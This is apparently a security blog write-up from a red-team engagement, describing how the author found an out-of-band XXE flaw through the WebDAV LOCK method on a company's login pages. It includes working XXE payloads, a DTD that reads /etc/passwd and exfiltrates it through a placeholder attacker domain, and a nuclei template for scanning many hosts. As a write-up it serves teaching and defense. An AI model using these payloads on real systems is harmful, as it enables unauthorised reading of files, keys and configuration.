---
layout: post
title: Exploiting Out-Of-Band XXE on Wildfire
date: 2021-02-19
summary: Data Exfiltration using XXE via HTTP LOCK Method
categories: Web Security
tags: [Bugs, Write-Ups, Web Security]
---

Hi Everyone 

In this blog ,i will cover one of the interesting vulnerability **Out-Of-Band XXE via HTTP LOCK Method** that i found during the Red Teaming Engagement in a `Product Based Company` and exploited the vulnerability at a **Large Scale**.

<p align="center">
  <img src="/images/xxe/xxe1.png">
</p>

Kudos to all my team members [Herane Malhotra](https://www.linkedin.com/in/herane-malhotra007/), [Lokendra Singh Rawat](https://www.linkedin.com/in/lokendrasinghrawat/), [Prashant Kumar](https://linkedin.com/in/notsoshant) who worked along during the assessment.

<p align="center">
  <img src="https://media.giphy.com/media/l3V0F3M2nJKxt3I2Y/giphy.gif">
</p>

**How it all started ?**

  Under the **Red Teaming Activty** there are many category such as Cyber Threat Intelligence, Internal Adversary Simulation, External Adversary Simulation, Social Engineering,Deep Web / Dark Web Exposure, OSINT, Phishing etc,.
  
<p align="center">
  <img src="/images/xxe/xxe2.png">
</p>
  
  This vulnerability was found during the  **External Adversary Simulation** Category, where we used to test for Web Application and Network Assets to find **Critical Server Side** bugs so that we can exfiltrate data to get an inital foothold.
  
**Let's Dive Deep into it!**

* There were hundreds of login pages under the web application pentesting part and credentials that was obtained from Deep / Dark Web Exposure were not working :(

<p align="center">
  <img src="https://media.giphy.com/media/p52j8LBZGNsMJPqqVF/giphy.gif">
</p>

* Found many login pages which was developed by the company to their customers to handle the data between both the parties.

**Step 1:** Intercept the login request using client side proxy like Burp Suite as shown below.

<p align="center">
  <img src="/images/xxe/xxe3.png">
</p>

**Step 2:** Started to check for different HTTP Methods enabled in the application by using **OPTIONS**

<p align="center">
  <img src="/images/xxe/xxe4.png">
</p>

From the above image , it can be observed that there is no reaction from the application , got the same response we see from **GET** method.

<p align="center">
  <img src="https://media.giphy.com/media/3og0INyCmHlNylks9O/giphy.gif">
</p>

**Step 3:** When i removed `login.jsp` and supplied a notexisting value (test) it showed up the different HTTP Methods that are allowed in the application.

<p align="center">
  <img src="/images/xxe/xxe05.png">
</p>

Note : The allowed methods are OPTIONS, MKCOL, PUT, LOCK.

<p align="center">
  <img src="https://media.giphy.com/media/jchcqpyTpIki4/giphy.gif">
</p>

* There is an existing research paper about **WebDav** by **Mikhail Egorov** 

Reference : [What should a hacker know about WebDav](https://www.slideshare.net/0ang3el/what-should-a-hacker-know-about-webdav)

<p align="center">
  <img src="/images/xxe/xxe12.png">
</p>

* If the application has `PROPPATCH,PROPFIND,LOCK` HTTP methods enabled, it will accept **XML** as input.

**Step 4:** Tried **PUT** method and it returned `403 forbidden error`, but when i tried **LOCK** method it showed up some **XML** data as output as shown below.

<p align="center">
  <img src="/images/xxe/xxe06.png">
</p>

* It was also mentioned that `OOB-XXE` will work with any methods that supports XML input.

<p align="center">
  <img src="/images/xxe/xxe13.png">
</p>

**Step 5:** So i started to test for **OOB-XXE** with basic payload as shown below.

```xml
<!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://youripaddress.com"> %xxe; ]>
```

<p align="center">
  <img src="/images/xxe/xxe7.png">
</p>

Note: We got both the **HTTP** and **DNS** hit from the server.

**Step 6:** Since it is an `Out-Of-Band XXE` , follow the below steps to set-up the environment.

**Note :** We need to host the DTD file on a web server. Here, we used a simple web server on the cloud and pointed the domain `yourdomainname.com` to the serverâ€™s public IP address and hosted the file `exploited.dtd` on the server.

Contents of `exploited.dtd`:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % ext "<!ENTITY exfil SYSTEM 'file:///%file;'>">
```

The request body send to the vulnerable URL:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY % xxe SYSTEM "http://yourdomainname.com/exploitd.dtd">
%xxe;
%ext;
]>
<foo><u>
&exfil;
</u></foo>
```

<p align="center">
  <img src="/images/xxe/xxe8.png">
</p>

**Step 7:** Now the fun begins , we were able to exfiltrate and read different directory files and sensitive information such as **backup file, configuration file, ssh keys and access logs** etc,.

<p align="center">
  <img src="/images/xxe/xxe9.png">
</p>

<p align="center">
  <img src="/images/xxe/xxe010.png">
</p>

<p align="center">
  <img src="https://media.giphy.com/media/3og0ILLVvPp8d64Jd6/giphy.gif">
</p>

<p align="center"><strong>Exploiting the Flaw in Wildfire</strong></p>

* Since there is a huge number of subdomains , we wrote a nuclei template to detect this **OOB-XXE** as shown below.

```yaml
id: XXE on XXXX Login

info:
  name: XML External Entity-XXXX
  author: dhiyaneshDk
  severity: high

requests:
  - raw: 
      - |
        LOCK /xxxx/test HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate
        Connection: close
        Upgrade-Insecure-Requests: 1
        Cache-Control: max-age=0
        Content-Length: 178
        
        <?xml version="1.0"?>
        <!DOCTYPE foo [
        <!ELEMENT foo ANY>
        <!ENTITY % xxe SYSTEM "http://yourdomainname.com/exploitd.dtd">
        %xxe;
        %ext;
        ]>
        <foo><u>
        &exfil
        </u></foo>

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        words:
          - '/root:x:0:0:root:/root:/bin/bash'
        part: body
```

<p align="center">
  <img src="/images/xxe/xxe11.png">
</p>

* There were around **36+ Instance** which was **Vulnerable** to XXE and cross checked all the instance manually.

<p align="center">
  <img src="https://media.giphy.com/media/DffShiJ47fPqM/giphy.gif">
</p>

<p align="center"><strong>Takeaway</strong></p>

<p align="center">
  <img src="/images/xxe/xxe14.png">
</p>

**Impact :**

The XXE flaw can allow an attacker to turn the XML parser into a proxy which allows local and remote content to be served on request. It allows an attacker to:
* Read files on the application server
* Interact with any back-end or external systems that the application itself can access
* View configuration files present in the system.

**Refernece :**

[Apache Jacrabbit WebDav XXE](https://www.youtube.com/watch?v=Hg3AXoG89Gs)       
[Finding and exploiting blind XXE vulnerabilities](https://portswigger.net/web-security/xxe/blind)            
[Advanced XXE Exploitation](https://gosecure.github.io/xxe-workshop/)   
[A Deep Dive into XXE Injection](https://www.synack.com/blog/a-deep-dive-into-xxe-injection/)      
[Milton Webdav 2.7.0.1 XXE Injection](https://packetstormsecurity.com/files/134178/Milton-Webdav-2.7.0.1-XXE-Injection.html)

<p align="center">
  <img src="https://media.giphy.com/media/XCyJsCbOeTBmEsHIss/giphy.gif">
</p>

Thanks a lot for reading :)
